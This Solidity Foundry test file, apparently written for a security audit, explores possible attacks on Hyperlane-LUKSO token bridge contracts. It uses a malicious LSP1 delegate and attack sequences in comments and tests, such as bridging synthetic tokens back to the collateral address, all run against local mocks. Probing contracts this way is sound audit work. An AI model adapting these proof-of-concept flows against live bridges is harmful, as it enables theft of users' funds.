pragma solidity ^0.8.13;

// test utilities
import { Test } from "forge-std/src/Test.sol";
import { Vm } from "forge-std/src/Vm.sol";
import { console } from "forge-std/src/console.sol";

/// Hyperlane testing environnement
/// @dev See https://docs.hyperlane.xyz/docs/guides/developer-tips/unit-testing
import { TypeCasts } from "@hyperlane-xyz/core/contracts/libs/TypeCasts.sol";
import { TestMailbox } from "@hyperlane-xyz/core/contracts/test/TestMailbox.sol";
import { TestPostDispatchHook } from "@hyperlane-xyz/core/contracts/test/TestPostDispatchHook.sol";
import { TestInterchainGasPaymaster } from "@hyperlane-xyz/core/contracts/test/TestInterchainGasPaymaster.sol";

import { GasRouter } from "@hyperlane-xyz/core/contracts/client/GasRouter.sol";
import { HypNative } from "@hyperlane-xyz/core/contracts/token/HypNative.sol";

// libraries
import { TokenRouter } from "@hyperlane-xyz/core/contracts/token/libs/TokenRouter.sol";
import { TokenMessage } from "@hyperlane-xyz/core/contracts/token/libs/TokenMessage.sol";

// Mocks + contracts to test
import { LSP7Mock } from "../Mocks/LSP7Mock.sol";
import { HypLSP7 } from "../../src/HypLSP7.sol";
import { HypLSP7Collateral } from "../../src/HypLSP7Collateral.sol";

// constants
import { OPERATION_0_CALL } from "@erc725/smart-contracts/contracts/constants.sol";

import { UniversalProfile } from "@lukso/universalprofile-contracts/contracts/UniversalProfile.sol";
import { LSP6KeyManager } from "@lukso/lsp6-contracts/contracts/LSP6KeyManager.sol";
import { UniversalProfileTestHelpers } from "../lib/UniversalProfileTestHelpers.sol";

import { AttackerLSP1Delegate } from "./AttackerLSP1Delegate.sol";

contract AuditExploitLOL is UniversalProfileTestHelpers {
    using TypeCasts for address;
    using TokenMessage for bytes;


    LSP7Mock internal lsp7;
    HypLSP7Collateral internal collateralToken;
    // TokenRouter internal localToken;
    HypLSP7 internal syntheticToken;
    TestMailbox internal localMailbox;
    TestMailbox internal remoteMailbox;
    TestPostDispatchHook internal noopHook;
    TestInterchainGasPaymaster internal igp;

    uint32 internal constant ORIGIN = 11;
    uint32 internal constant DESTINATION = 12;
    uint8 internal constant DECIMALS = 18;
    uint256 internal constant TOTAL_SUPPLY = 1_000_000e18;
    uint256 internal constant GAS_LIMIT = 10_000;
    uint256 internal constant TRANSFER_AMOUNT = 100e18;
    string internal constant NAME = "HyperlaneInu";
    string internal constant SYMBOL = "HYP";
    bytes internal constant SAMPLE_METADATA_BYTES =
        hex"00006f357c6a0020820464ddfac1bec070cc14a8daf04129871d458f2ca94368aae8391311af6361696670733a2f2f516d597231564a4c776572673670456f73636468564775676f3339706136727963455a4c6a7452504466573834554178";
    uint256 internal REQUIRED_VALUE; // initialized in setUp

    
    UniversalProfile UP;
    address internal ATTACKER = makeAddr("attacker");
    address internal OWNER = makeAddr("owner");
    bytes32[] permissions;
    AttackerLSP1Delegate maliciousLSP1Delegate;
    LSP6KeyManager keyManager;

    uint attackerStartAmt   = 10 * 10 ** 18;
    uint collateralStartAmt = 0 * 10 ** 18;
    /**
    ATTACK 1
    1. Attacker transfers funds to collateral contracts
    2. Hook calls fallback function on attacker's UP
    3. The fallback lookup function looks up the extension address for the unknown function signature
    4. The Attackers UP returns the address of the Collateral contract
    5. Collateral contract is tricked into calling _transferTo
        DOES msg.sender get updated to the UP or does it remain teh Collateral contract?
     */
    
    /**
    ATTACK 2
    1. Attacker transfers funds to collateral contract
    2. Hook calls universalreceiver
    3. UniversalReceiver does what???
     */


    /**
    ATTACK 3
    1. attacker transfers funds to collateral contract
    2. funds are bridged to synethic and minted to attacker on DEStiNATION
    3. attacker "withdraws" from collateral contract by transferRemote(ORIGIN)
    4. attacker bridges synthetic tokens back to ORIGIN
    
     */
    function setUp() override public {
        super.setUp();
        UP = _setUpUniversalProfileLikeBrowserExtension(ATTACKER);
        maliciousLSP1Delegate = new AttackerLSP1Delegate();

        _setUpSpecificLSP1DelegateForTokensSent(
            UP,
            ATTACKER,
            maliciousLSP1Delegate,
            permissions
        );

        keyManager = LSP6KeyManager(UP.owner());

        localMailbox = new TestMailbox(ORIGIN);
        remoteMailbox = new TestMailbox(DESTINATION);

        lsp7 = new LSP7Mock(NAME, SYMBOL, address(this), TOTAL_SUPPLY);
        collateralToken = new HypLSP7Collateral(address(lsp7), address(localMailbox));
        collateralToken.initialize(address(noopHook), address(0), OWNER);
        lsp7.mintTo(address(UP), attackerStartAmt);//(ATTACKER, )
        lsp7.mintTo(address(collateralToken), collateralStartAmt);
        lsp7.mintTo(ATTACKER, attackerStartAmt);

        noopHook = new TestPostDispatchHook();
        localMailbox.setDefaultHook(address(noopHook));
        localMailbox.setRequiredHook(address(noopHook));

        remoteMailbox.setDefaultHook(address(noopHook));
        remoteMailbox.setRequiredHook(address(noopHook));

        REQUIRED_VALUE = noopHook.quoteDispatch("", "");

        syntheticToken = new HypLSP7(DECIMALS, address(remoteMailbox));

        syntheticToken.initialize(0, NAME, SYMBOL, address(noopHook), address(0), OWNER, SAMPLE_METADATA_BYTES);

        

        // vm.prank(OWNER);
        // hypLSP7Token.initialize(TOTAL_SUPPLY, NAME, SYMBOL, address(noopHook), address(0), OWNER, SAMPLE_METADATA_BYTES);

        vm.startPrank(OWNER);
        syntheticToken.enrollRemoteRouter(ORIGIN, address(collateralToken).addressToBytes32());
        collateralToken.enrollRemoteRouter(DESTINATION, address(syntheticToken).addressToBytes32());
        vm.stopPrank();

        igp = new TestInterchainGasPaymaster();

        vm.deal(ATTACKER, 125_000);

    }

    function testSendingToCollateralContractCallsHook() public {
        uint attackerBal = lsp7.balanceOf(ATTACKER);
        console.log("ATTCK LSP7 BAL ", attackerBal);

        console.log("ATTACKER ", ATTACKER);
        console.log("UP:      ", address(UP));
        console.log("COLLTOKN ", address(collateralToken));
        console.log("KEYMGR   ", address(keyManager));

        vm.startPrank(ATTACKER);
        bytes memory operatorNotificationData = "";
        uint256 amount = 1 * 10 ** 18;
        if(amount < attackerBal) {
            console.log("LESS THAN");
        }
        // lsp7.authorizeOperator(address(collateralToken), amount, operatorNotificationData);
        console.log("Attacker calls authorizeOperator() ", amount);
        bytes memory authorizeOperatorPayload = abi.encodeWithSelector(
            lsp7.authorizeOperator.selector,
            address(collateralToken),
            amount,
            operatorNotificationData
        );
        UP.execute(OPERATION_0_CALL, address(lsp7), 0, authorizeOperatorPayload);



        console.log("Attacker calls transferRemote()");
       // Encode the transferRemote function call
        bytes memory transferRemotePayload = abi.encodeWithSelector(
            bytes4(keccak256("transferRemote(uint32,bytes32,uint256)")),
            DESTINATION,                   // dest DOMAIN
            ATTACKER.addressToBytes32(),  // recipient
            amount
        );
        
        // Simulate the Device Controller calling the Key Manager
        UP.execute(OPERATION_0_CALL, address(collateralToken), 0, transferRemotePayload);


        vm.stopPrank();
    }

    function testTransferRemoteOrigin() public {
        uint attackerBal = lsp7.balanceOf(ATTACKER);
        console.log("ATTCK LSP7 BAL ", attackerBal);

        console.log("ATTACKER ", ATTACKER);
        // console.log("UP:      ", address(UP));
        // console.log("COLLTOKN ", address(collateralToken));
        // console.log("KEYMGR   ", address(keyManager));
        vm.startPrank(ATTACKER);
        bytes memory operatorNotificationData = "";
        uint256 amount = 1 * 10 ** 18;
        if(amount < attackerBal) {
            console.log("LESS THAN");
        }
        
        console.log("Attacker calls authorizeOperator() ", amount);
        lsp7.authorizeOperator(address(collateralToken), amount, operatorNotificationData);
       
        // this fails because there is no router configured to Bridge from Origin->Origin
        collateralToken.transferRemote(ORIGIN, ATTACKER.addressToBytes32(), amount);
        uint attackerBal2 = lsp7.balanceOf(ATTACKER);
        uint colBal = lsp7.balanceOf(address(collateralToken));
        console.log("Attacker balance ", attackerBal2);
        console.log("Colltral balance ", colBal);
        vm.stopPrank();


    }

    function testTransferRemotetoSynthetic() public {

    }

    function testTransferRemoteToCollateral() public {
        // Bridge from Ethereum -> LUKSO
        // usdc -> lock in USDC Collateral.transferRemote(LUKSO, metamaskAddress, 666)

        // // Bridge back to Ethereum, but put collateral as recipient address
        // syntheticUSDC.transferRemote(ETHEREUM, 0xcollateral, 666)

        uint attackerBal1 = lsp7.balanceOf(ATTACKER);
        uint attackerSynBal1 = syntheticToken.balanceOf(ATTACKER);
        uint colBal1 = lsp7.balanceOf(address(collateralToken));
        uint totalSupply1 = syntheticToken.totalSupply();
        
        // console.log("ADDRESSES");
        // console.log("ATTACKER ", ATTACKER);
        // console.log("LSP7     ", address(lsp7));
        // console.log("COLLTOKN ", address(collateralToken));
        // console.log("SYNTHETIC", address(syntheticToken));
        // console.log("LOCAL MB ", address(localMailbox));
        // console.log("REMOTE MB", address(remoteMailbox));

        // console.log("BALANCES START");
        // console.log("LSP7 (ATTACKER) ", attackerBal1);
        // console.log("LSP7 (COLLATRL) ", colBal1);
        // console.log("SYNT (ATTACKER) ", attackerSynBal1);
        // console.log("SYNT SUPPLY     ", totalSupply1);
        
        bytes memory operatorNotificationData = "";
        uint256 amount = 1 * 10 ** 18;
        
        vm.startPrank(ATTACKER);
        console.log("Attacker calls authorizeOperator() ", amount);
        lsp7.authorizeOperator(address(collateralToken), amount, operatorNotificationData);
        
        console.log("Attacker calls transferRemote()");
        collateralToken.transferRemote(DESTINATION, ATTACKER.addressToBytes32(), amount);
        
        // // console.log("BALANCES POST TRANSFER");
        // uint attackerBal2 = lsp7.balanceOf(ATTACKER);
        // uint colBal2 = lsp7.balanceOf(address(collateralToken));
        // console.log("LSP7 (ATTACKER)", attackerBal2);
        // console.log("LSP7 (COLLATERAL)", colBal2);
        vm.stopPrank();

        // handle message on DESTINATION CHAIN
        bytes memory message = TokenMessage.format(ATTACKER.addressToBytes32(), amount,"");
         vm.prank(address(remoteMailbox));
        syntheticToken.handle(ORIGIN, address(collateralToken).addressToBytes32(), message);

        // confirm attacker balance
        // uint attackerSynBal2 = syntheticToken.balanceOf(ATTACKER);
        // uint totalSupply2 = syntheticToken.totalSupply();
        
        // console.log("BALANCES POST BRIDGED");
        // console.log("SYNT (ATTACKER) ", attackerSynBal2);
        // console.log("SYNT SUPPLY     ", totalSupply2);

        // bridge back but to COLLATERAL ADDRESS
        console.log("Attacker bridges back");
        vm.prank(ATTACKER);
        syntheticToken.transferRemote(ORIGIN, address(collateralToken).addressToBytes32(), amount);

        // handle message on ORIGIN chain
        message = TokenMessage.format(address(collateralToken).addressToBytes32(),amount,"");
        vm.prank(address(localMailbox));
        collateralToken.handle(DESTINATION, address(syntheticToken).addressToBytes32(), message);

        uint attackerBal3 = lsp7.balanceOf(ATTACKER);
        uint attackerSynBal3 = syntheticToken.balanceOf(ATTACKER);
        uint colBal3 = lsp7.balanceOf(address(collateralToken));
        uint totalSupply3 = syntheticToken.totalSupply();
        console.log("BALANCES START");
        console.log("LSP7 (ATTACKER) ", attackerBal1);
        console.log("LSP7 (COLLATRL) ", colBal1);
        console.log("SYNT (ATTACKER) ", attackerSynBal1);
        console.log("SYNT SUPPLY     ", totalSupply1);
        console.log("BALANCES END");
        console.log("LSP7 (ATTACKER) ", attackerBal3);
        console.log("LSP7 (COLLATRL) ", colBal3);
        console.log("SYNT (ATTACKER) ", attackerSynBal3);
        console.log("SYNT SUPPLY     ", totalSupply3);

       
    }


}



